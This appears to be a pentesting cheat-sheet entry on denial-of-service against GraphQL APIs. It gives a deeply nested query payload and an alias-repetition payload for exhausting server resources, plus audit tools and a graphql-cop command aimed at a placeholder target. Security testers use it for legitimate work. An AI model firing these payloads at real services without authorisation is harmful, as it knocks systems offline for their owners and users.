---
tags:
  - Exploitation
  - Foundational
  - HTTP
  - Initial_Access
  - Web_Application
---

### DoS via Nested Queries
> [!danger] Deeply nested queries can cause resource exhaustion.

```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              id
            }
          }
        }
      }
    }
  }
}
```

#### Alias-Based DoS [alternative]
> Use aliases to request same expensive field multiple times.

```graphql
query {
  a1: expensiveField
  a2: expensiveField
  a3: expensiveField
  # ... repeat many times
}
```

### Tools
> **GraphQL Voyager** for visualization, **graphql-cop** for security audit.

```bash
# Security audit
python graphql-cop.py -t https://<TargetHost>/graphql

# Schema visualization - upload introspection result
# https://graphql-kit.com/graphql-voyager/
```
